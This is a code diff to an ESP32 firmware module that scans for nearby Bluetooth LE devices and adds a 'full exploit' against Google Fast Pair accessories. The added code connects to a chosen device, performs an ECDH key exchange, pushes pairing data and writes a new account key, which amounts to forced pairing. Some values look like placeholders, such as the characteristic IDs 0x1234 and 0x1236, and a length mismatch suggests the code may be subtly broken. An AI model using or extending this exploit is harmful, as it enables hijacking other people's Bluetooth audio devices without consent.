@@ -1,19 +1,21 @@
 #include "whisperpair.h"
 #include "whisperpair_audio.h"
+#include "fastpair_crypto.h"
 #include <globals.h>
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/utils.h"
 #include "esp_mac.h"
 
-#ifdef CONFIG_BT_NIMBLE_ENABLED
+extern std::vector<String> fastPairDevices;
+extern bool returnToMenu;
+
 #if __has_include(<NimBLEExtAdvertising.h>)
 #define NIMBLE_V2_PLUS 1
 #endif
-#endif
 
-extern std::vector<String> fastPairDevices;
-extern bool returnToMenu;
+AudioCommandService audioCmd;
+FastPairCrypto crypto;
 
 bool initBLEIfNeeded(const char* deviceName) {
     static bool initialized = false;
@@ -132,26 +134,6 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
 }
 
 String selectTargetFromScan(const char* title) {
-    struct BLE_Device {
-        std::string address;
-        std::string name;
-        int rssi;
-    };
-    std::vector<BLE_Device> foundDevices;
-    
-    BLEDevice::init("");
-    
-    BLEScan* pScan = BLEDevice::getScan();
-    if (!pScan) {
-        displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
-        return "";
-    }
-    
-    pScan->clearResults();
-    pScan->setActiveScan(true);
-    pScan->setInterval(100);
-    pScan->setWindow(99);
-    
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle(title);
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
@@ -161,48 +143,54 @@ String selectTargetFromScan(const char* title) {
     tft.setCursor(20, 80);
     tft.print("Found: 0");
     
-    tft.fillRect(20, 140, tftWidth - 40, 10, TFT_DARKGREY);
-    
-    uint32_t scanStartTime = millis();
-    
-    BLEScanResults results;
-    
-#ifdef NIMBLE_V2_PLUS
-    results = pScan->getResults(30000, false);
-#else
-    results = pScan->start(30, false);
-#endif
-    
-    pScan->clearResults();
-    
-    int deviceCount = results.getCount();
-    for(int i = 0; i < deviceCount; i++) {
-        const BLEAdvertisedDevice* device = results.getDevice(i);
-        if(!device) continue;
-        
-        BLE_Device dev;
-        dev.address = device->getAddress().toString();
-        dev.name = device->getName();
-        if(dev.name.empty()) dev.name = "<no name>";
-        dev.rssi = device->getRSSI();
-        
-        foundDevices.push_back(dev);
+    BLEDevice::init("");
+    BLEScan* pBLEScan = BLEDevice::getScan();
+    if (!pBLEScan) {
+        displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
+        return "";
     }
     
-    tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
-    tft.setCursor(20, 80);
-    tft.print("Found: " + String(foundDevices.size()));
+    pBLEScan->clearResults();
+    pBLEScan->setActiveScan(true);
+    pBLEScan->setInterval(100);
+    pBLEScan->setWindow(99);
     
-    if(foundDevices.empty()) {
+    BLEScanResults foundDevices;
+    
+#ifdef NIMBLE_V2_PLUS
+    foundDevices = pBLEScan->getResults(30000, false);
+#else
+    foundDevices = pBLEScan->start(30, false);
+#endif
+    
+    pBLEScan->clearResults();
+    
+    int deviceCount = foundDevices.getCount();
+    
+    if(deviceCount == 0) {
         displayMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
         delay(1500);
         return "";
     }
     
-    std::sort(foundDevices.begin(), foundDevices.end(), 
-        [](const BLE_Device& a, const BLE_Device& b) {
-            return a.rssi > b.rssi;
-        });
+    std::vector<String> deviceNames;
+    std::vector<String> deviceAddresses;
+    std::vector<int> deviceRSSIs;
+    
+    for(int i = 0; i < deviceCount; i++) {
+        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
+        if(!device) continue;
+        
+        String name = device->getName().c_str();
+        String address = device->getAddress().toString().c_str();
+        int rssi = device->getRSSI();
+        
+        if(name.isEmpty()) name = address;
+        
+        deviceNames.push_back(name);
+        deviceAddresses.push_back(address);
+        deviceRSSIs.push_back(rssi);
+    }
     
     int currentIndex = 0;
     bool redraw = true;
@@ -217,22 +205,20 @@ String selectTargetFromScan(const char* title) {
             tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
             
             tft.setCursor(20, 50);
-            tft.print("Found: " + String(foundDevices.size()));
+            tft.print("Found: " + String(deviceCount));
             
             tft.setCursor(20, 70);
-            tft.print("Device " + String(currentIndex + 1) + "/" + String(foundDevices.size()));
+            tft.print("Device " + String(currentIndex + 1) + "/" + String(deviceCount));
             
-            if(currentIndex < foundDevices.size()) {
-                BLE_Device& dev = foundDevices[currentIndex];
-                
+            if(currentIndex < deviceCount) {
                 tft.setCursor(20, 100);
-                tft.print("Name: " + String(dev.name.c_str()));
+                tft.print("Name: " + deviceNames[currentIndex]);
                 
                 tft.setCursor(20, 120);
-                tft.print("MAC: " + String(dev.address.c_str()));
+                tft.print("MAC: " + deviceAddresses[currentIndex]);
                 
                 tft.setCursor(20, 140);
-                tft.print("RSSI: " + String(dev.rssi) + " dBm");
+                tft.print("RSSI: " + String(deviceRSSIs[currentIndex]) + " dBm");
             }
             
             tft.setCursor(20, 180);
@@ -255,13 +241,14 @@ String selectTargetFromScan(const char* title) {
                 redraw = true;
             }
         } else if(check(NextPress)) {
-            if(currentIndex < foundDevices.size() - 1) {
+            if(currentIndex < deviceCount - 1) {
                 currentIndex++;
                 redraw = true;
             }
         } else if(check(SelPress)) {
-            if(currentIndex < foundDevices.size()) {
-                selectedMAC = String(foundDevices[currentIndex].address.c_str());
+            if(currentIndex < deviceCount) {
+                selectedMAC = deviceAddresses[currentIndex];
+                break;
             }
         }
     }
@@ -269,13 +256,116 @@ String selectTargetFromScan(const char* title) {
     return selectedMAC;
 }
 
+bool fastpair_ecdh_key_exchange(NimBLEAddress target, uint8_t* shared_secret) {
+    displayMessage("Connecting...", "", "", "", TFT_WHITE);
+    NimBLEClient* pClient = NimBLEDevice::createClient();
+    if(!pClient->connect(target)) {
+        displayMessage("Connect failed", "", "", "", TFT_RED);
+        return false;
+    }
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) {
+        displayMessage("No FastPair service", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+    if(!pKeyChar) {
+        displayMessage("No KBP char", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    displayMessage("Generating key...", "", "", "", TFT_WHITE);
+    uint8_t our_pubkey[65];
+    size_t pub_len = 65;
+    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
+        displayMessage("Key gen failed", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    uint8_t keyExchangeMsg[67] = {0};
+    keyExchangeMsg[0] = 0x00;
+    keyExchangeMsg[1] = 0x20;
+    memcpy(&keyExchangeMsg[2], our_pubkey, 65);
+    displayMessage("Sending key...", "", "", "", TFT_WHITE);
+    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
+        displayMessage("Send failed", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    delay(100);
+    displayMessage("Waiting response...", "", "", "", TFT_WHITE);
+    std::string response = pKeyChar->readValue();
+    if(response.length() < 67) {
+        displayMessage("Bad response", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
+    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
+        displayMessage("Shared secret failed", "", "", "", TFT_RED);
+        pClient->disconnect();
+        return false;
+    }
+    memcpy(shared_secret, crypto.getSharedSecret(), 32);
+    pClient->disconnect();
+    return true;
+}
+
+bool fastpair_complete_pairing(NimBLEAddress target, const uint8_t* shared_secret) {
+    NimBLEClient* pClient = NimBLEDevice::createClient();
+    if(!pClient->connect(target)) return false;
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) {
+        pClient->disconnect();
+        return false;
+    }
+    NimBLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+    if(!pKeyChar) {
+        pClient->disconnect();
+        return false;
+    }
+    uint8_t nonce[16];
+    esp_fill_random(nonce, 16);
+    uint8_t pairingData[50] = {0};
+    pairingData[0] = 0x00;
+    pairingData[1] = 0x30;
+    memcpy(&pairingData[2], nonce, 16);
+    memcpy(&pairingData[18], shared_secret, 16);
+    if(!pKeyChar->writeValue(pairingData, 34, false)) {
+        pClient->disconnect();
+        return false;
+    }
+    delay(100);
+    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
+    if(pAccountChar) {
+        crypto.generateAccountKey();
+        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
+    }
+    pClient->disconnect();
+    return true;
+}
+
+bool whisperPairFullExploit(NimBLEAddress target) {
+    uint8_t shared_secret[32];
+    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
+    if(!fastpair_complete_pairing(target, shared_secret)) return false;
+    return true;
+}
+
 void testFastPairVulnerability() {
-    initBLEIfNeeded();
+    initBLEIfNeeded("Bruce-WP");
     
-    String selectedMAC = selectTargetFromScan("SELECT TARGET");
+    String selectedMAC = selectTargetFromScan("FAST PAIR SCAN");
     if(selectedMAC.isEmpty()) return;
     
-    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
+    NimBLEAddress target;
+    try {
+        target = NimBLEAddress(selectedMAC.c_str(), BLE_ADDR_RANDOM);
+    } catch (...) {
+        displayMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+        return;
+    }
     
     if(!requireSimpleConfirmation("Test vulnerability?")) return;
     
@@ -328,11 +418,21 @@ void whisperPairMenu() {
             if(check(SelPress)) break;
             delay(50);
         }
+        
         String selectedMAC = selectTargetFromScan("SELECT TARGET");
         if(selectedMAC.isEmpty()) return;
-        NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
+        
+        NimBLEAddress target;
+        try {
+            target = NimBLEAddress(selectedMAC.c_str(), BLE_ADDR_RANDOM);
+        } catch (...) {
+            displayMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+            return;
+        }
+        
         int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
         if(confirm != 1) return;
+        
         bool success = whisperPairFullExploit(target);
         if(success) {
             displayMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
